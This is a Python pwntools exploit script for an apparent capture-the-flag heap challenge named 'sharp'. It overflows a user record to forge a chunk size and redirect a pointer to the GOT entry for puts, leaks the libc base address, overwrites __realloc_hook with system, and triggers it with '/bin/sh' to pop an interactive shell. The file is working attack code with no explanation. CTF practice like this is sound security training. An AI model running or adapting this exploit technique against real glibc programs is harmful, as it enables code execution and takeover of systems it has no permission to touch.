#!/usr/bin/env python3
from pwn import *

n = 0

def start():
    global p
    if args.REMOTE:
        p = remote('challenge.ctf.games', 31782)
    else:
        p = elf.process(env = {"LD_PRELOAD": libc.path})

def sendchoice(choice: int):
    p.sendlineafter('\n> ', str(choice))

def add_user(username: bytes = b'stdnoerr'):
    sendchoice(1)

    p.sendlineafter(': ', username)

    global n
    n += 1

    return n - 1

def remove_user(index: int):
    sendchoice(2)

    p.sendlineafter(': ', str(index))

def edit_user(index: int, new_username: bytes = b'stdnoerr'):
    sendchoice(3)

    p.sendlineafter('edit: ', str(index))
    p.sendlineafter('name: ', new_username)

def swap_users(user1: int, user2: int):
    sendchoice(4)

    p.sendlineafter(': ', str(user1))
    p.sendlineafter(': ', str(user2))

def list_users():
    sendchoice(5)

context.binary = elf = ELF('./sharp')
libc = ELF('./libc_2.31.so')
start()

a = add_user()
b = add_user()
c = add_user()
d = add_user()
e = add_user()

edit_user(b, b'A'*0x78 + p64(0x101))
edit_user(c, b'A'*0x80 + p64(elf.got.puts)[:3])

list_users()
p.recvuntil('user: ')
libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.puts

print(hex(libc.address))

edit_user(c, b'A'*0x80 + p64(libc.sym.__realloc_hook)[:6])

edit_user(0, p64(libc.sym.system)[:6])

edit_user(c, b'A'*0x80 + b'/bin/sh')

# time.sleep(2)
sendchoice(1)

p.interactive()
p.close()
